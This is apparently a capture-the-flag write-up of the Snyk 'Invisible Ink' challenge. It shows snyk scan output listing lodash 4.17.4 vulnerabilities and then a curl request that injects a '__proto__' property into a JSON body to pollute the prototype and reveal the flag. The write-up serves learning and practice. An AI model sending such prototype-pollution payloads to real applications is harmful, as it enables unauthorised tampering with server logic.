# Challenge: Invisible Ink

[Snyk CTF challenge](https://101.ctf-snyk.io/challenges#Invisible%20Ink-1)

## Target

http://invisible-ink.c.ctf-snyk.io/

Supplied files:
- index.js
- package.json

## Attempts

```
   18  curl http://invisible-ink.c.ctf-snyk.io/
```

- browse to link
  - `POST /echo`
  - `Content-Type: application/json`
  - body: `{"message": "ping"}`
  - response: `{"userIP": "127.0.0.1", "time": 1608203140926, "message": "ping", "flag": "disabled"}`

The `flag` property is interesting. Try to enable it.

```
   31  snyk auth $SNYK_AUTH_TOKEN
   25  snyk test package.json               # needs dependencies
   26  snyk test --file=package.json        # needs dependencies
```

Generate the full dependencies for the supplied `package.json` file. Then test that file with `snyk`

```
   63  npm install --package-lock-only
   64  snyk test --file=package-lock.json

Testing /workspace/snyk-ctf101-workshop...

Tested 51 dependencies for known issues, found 8 issues, 8 vulnerable paths.

Issues to fix by upgrading:

  Upgrade lodash@4.17.4 to lodash@4.17.21 to fix
  ✗ Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-LODASH-1018905] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-LODASH-73639] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [Medium Severity][https://security.snyk.io/vuln/npm:lodash:20180130] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Command Injection [High Severity][https://security.snyk.io/vuln/SNYK-JS-LODASH-1040724] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-LODASH-567746] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-LODASH-608086] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-LODASH-450202] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-LODASH-73638] in lodash@4.17.4
    introduced by lodash@4.17.4

Organization:      perry.branch
Package manager:   npm
Target file:       package-lock.json
Project name:      Try-Snyk
Open source:       no
Project path:      /workspace/snyk-ctf101-workshop
Licenses:          enabled
```

Exploit the Prototype Pollution using Property Injection

```
   72  curl -X POST http://invisible-ink.c.ctf-snyk.io/echo
   73  curl -H 'Content-Type: application/json' -X POST http://invisible-ink.c.ctf-snyk.io/echo
   74  curl -H 'Content-Type: application/json' -X POST http://invisible-ink.c.ctf-snyk.io/echo -d '{"message": "ping"}'

{"userID":"34.127.107.182, 34.111.128.148","time":1663190263065,"message":"ping","flag":"disabled"}

   88  curl -sSL -H 'Content-Type: application/json' -X POST http://invisible-ink.c.ctf-snyk.io/echo -d '{"message": "ping", "__proto__": {"flag": "true"}}'

{"userID":"34.127.107.182, 34.111.128.148","time":1663190508558,"message":"ping","flag":"SNYK{6a6a6fff87f3cfdca056a077804838d4e87f25f6a11e09627062c06f142b10dd}"}
```